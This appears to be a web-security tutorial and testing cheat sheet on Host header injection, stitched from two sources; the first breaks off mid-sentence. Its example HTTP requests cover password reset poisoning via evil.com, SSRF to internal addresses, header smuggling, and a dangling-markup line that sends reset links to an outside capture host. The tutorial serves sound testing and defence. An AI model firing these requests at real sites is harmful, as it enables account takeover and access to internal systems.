## Table of Contents
1. [Introduction](#introduction)
2. [How Does Host Header Injection Occur?](#how-does-host-header-injection-occur)
3. [Where to Put a Host Header Injection Payload?](#where-to-put-a-host-header-injection-payload)
4. [Examples of Host Header Injection Attacks](#examples-of-host-header-injection-attacks)
   - 4.1 [Basic Host Header Injection](#basic-host-header-injection)
   - 4.2 [Web Cache Poisoning Using Host Header Injection](#web-cache-poisoning-using-host-header-injection)
   - 4.3 [Password Reset Poisoning via Host Header Injection](#password-reset-poisoning-via-host-header-injection)
   - 4.4 [Exploiting Host Header Injection for SSRF](#exploiting-host-header-injection-for-ssrf)
5. [How to Test for Host Header Injection?](#how-to-test-for-host-header-injection)
   - 5.1 [Supply an Arbitrary Host Header](#supply-an-arbitrary-host-header)
   - 5.2 [Accessing Restricted Functionality or Routing-Based SSRF](#accessing-restricted-functionality-or-routing-based-ssrf)
   - 5.3 [Send Ambiguous Requests](#send-ambiguous-requests)
      - 5.3.1 [Inject Duplicate Host Headers](#inject-duplicate-host-headers)
      - 5.3.2 [Add Line Wrapping](#add-line-wrapping)
      - 5.3.3 [Supply an Absolute URL](#supply-an-absolute-url)
      - 5.3.4 [SSRF via Flawed Request Parsing](#ssrf-via-flawed-request-parsing)
   - 5.4 [Inject Host Override Headers](#inject-host-override-headers)
   - 5.5 [Connection State Attacks](#connection-state-attacks)
   - 5.6 [SSRF via a Malformed Request Line](#ssrf-via-a-malformed-request-line)
   - 5.7 [Check for Flawed Validation](#check-for-flawed-validation)
6. [Preventing Host Header Injection](#preventing-host-header-injection)
   - 6.1 [Validate the Host Header](#validate-the-host-header)
   - 6.2 [Use Server Configurations to Restrict Valid Hostnames](#use-server-configurations-to-restrict-valid-hostnames)
   - 6.3 [Avoid Using the Host Header for Security Decisions](#avoid-using-the-host-header-for-security-decisions)
7. [Tools for Testing Host Header Injection](#tools-for-testing-host-header-injection)
   - 7.1 [Burp Suite's Param Miner](#burp-suites-param-miner)
8. [Conclusion](#conclusion)

## Introduction
**Host Header Injection** is a web security vulnerability that occurs when an application improperly trusts the value of the "Host" header in an HTTP request. If an attacker can manipulate this header and the server processes or uses it without validation, the attacker may exploit it for various attacks, such as web cache poisoning, server-side request forgery (SSRF), password reset poisoning, or bypassing access control mechanisms.

### How Does Host Header Injection Occur?

1. **Improper Trust in the Host Header**:
   - When a web server or application uses the "Host" header value for important operations (such as building links, redirecting users, or generating URLs) without validating or verifying it, the attacker can manipulate the header to inject malicious values.

2. **Misconfigured Web Servers**:
   - Some web servers do not verify the "Host" header value properly, allowing the attacker to supply a different "Host" header in the HTTP request, which is then used by the server in an unsafe manner.

3. **Usage of the Host Header in Application Logic**:
   - If the application uses the "Host" header to construct absolute URLs for links, redirects, or resource loading, an attacker can exploit this to alter the behavior of the application.

### Where to Put a Host Header Injection Payload?

A Host Header Injection payload is placed directly in the "Host" header of an HTTP request. The attacker modifies the value of the header to exploit the vulnerability. Here are some example scenarios:

### 1. Examples of Host Header Injection Attacks

If an application generates absolute links based on the "Host" header, you can manipulate the header value to control the generated links.

**Example HTTP Request:**
```
GET / HTTP/1.1
Host: evil.com
```
If the server uses the "Host" header to build links like `http://original-website.com/page`, it may now generate `http://evil.com/page`, potentially allowing the attacker to perform phishing attacks.

### 2. Web Cache Poisoning Using Host Header Injection

If the application is cached based on the "Host" header, an attacker can manipulate the cache to store a malicious response.

**Example HTTP Request:**
```
GET / HTTP/1.1
Host: evil.com
X-Forwarded-Host: vulnerable-website.com
```
Here, the attacker manipulates the "Host" header to `evil.com`, while the actual content belongs to the original website. If this response gets cached, future visitors may see the attacker's content.

### 3. Password Reset Poisoning via Host Header Injection

When an application sends password reset links based on the "Host" header, an attacker can manipulate the header to send a reset link pointing to their controlled domain.

**Example HTTP Request:**
```
POST /reset-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

email=user@victim.com
```
In this case, the password reset link may be generated using `evil.com`, making the victim click on a malicious link controlled by the attacker.

### 4. Exploiting Host Header Injection for SSRF

Host Header Injection can be combined with SSRF if the server uses the "Host" header to perform server-side requests.

**Example HTTP Request:**
```
GET /internal-api HTTP/1.1
Host: 127.0.0.1
```
Here, the server might use the "Host" header to make requests internally, allowing the attacker to access internal resources.

### Preventing Host Header Injection

- **Validate the "Host" Header**:
  - Only allow expected and trusted hostnames, rejecting requests with unrecognized or manipulated hostnames.

- **Use Server Configurations to Restrict Valid Hostnames**:
  - Configure the web server (e.g., Apache, Nginx) to accept only valid "Host" headers that match the application's domain.

- **Avoid Using the "Host" Header for Security Decisions**:
  - Do not rely on the "Host" header for authentication, access

# What can we do via Host Header injection?
```txt
    1. Password Reset Poisoning
    2. Routing Based SSRF
```
# How to test?
___
## Supply an arbitrary Host header. If vulnerable, this will generate 200 OK response or 504 server gateway error.
```txt
GET /example HTTP/1.1
Host: google.com
```
## Accessing restricted functionality or Routing Based SSRF
#### It is common for websites to not restrict access to certain functionality for internal users only or host private sites in same server. Try to access it by localhost or brute-forcing.
```txt
Host: localhost
Host: 127.0.0.1
Host: 192.168.0.$fuzz$
```
## Send ambiguous requests
#### Inject duplicate Host headers
```txt
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: google.com
```
#### Add line wrapping
```txt
GET /example HTTP/1.1
    Host: google.com
Host: vulnerable-website.com
```
#### Supply an absolute URL
##### Normal case
```txt
GET https://vulnerable-website.com/ HTTP/1.1
Host: google.com
```
##### SSRF via flawed request parsing
```txt
GET https://0ada009a03fb929382cd2e7000e600be.web-security-academy.net HTTP/2
Host: ybdifpxyiesrimyyvm2e9wxgy74yssgh.oastify.com
```
In this case, now try bruteforcing ip address.
#### Inject host override headers
```txt
X-Forwarded-Host:
X-Host:
X-Original-URL:
X-Forwarded-Server:
X-HTTP-Host-Override:
Forwarded:
X-Forwarded-For:
```
Note: In Burp Suite, you can use the Param Miner extension's "Guess headers" function to automatically probe for supported headers using its extensive built-in wordlist.
## Connection state attacks
#### For performance reasons, many websites reuse connections for multiple request/response cycles with the same client. In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection. 
```
Step 1 >> Duplicate a request.
Step 2 >> Change the Connection header to keep-alive in 1st request.
Step 3 >> Change the request method GET to POST in 2nd request.
Step 4 >> Mention the administrator path and change the host to local ip in 2nd request.
Step 5 >> Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection) and send both request together.
```
```txt
POST /admin HTTP/1.1
Host: 192.168.0.1 
```
## SSRF via a malformed request line
####  A reverse proxy might take the path from the request line, prefix it with http://backend-server, and route the request to that upstream URL. If the path starts with @ instead of /, the resulting upstream URL will be http://backend-server@private-intranet/example, which most HTTP libraries interpret as a request to access private-intranet with the username backend-server. So try to use @ instead of /
```txt
GET @private-intranet/example HTTP/1.1
```
## Check for flawed validation (Check portswigger for more)
#### Instead of receiving an "Invalid Host header" response, you might find that your request is blocked as a result of some kind of security measure. If this happen, try to use port or non numeric staff in port. (You can use this method for password reset link hijacking via dangling markup) 
```txt
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
Host: vulnweb.com:'<a href="//8jsdeu8fe6r8ju28t0lsplhjhan1bvzk.oastify.com/? (Password reset link hijacking via dangling markup)
```
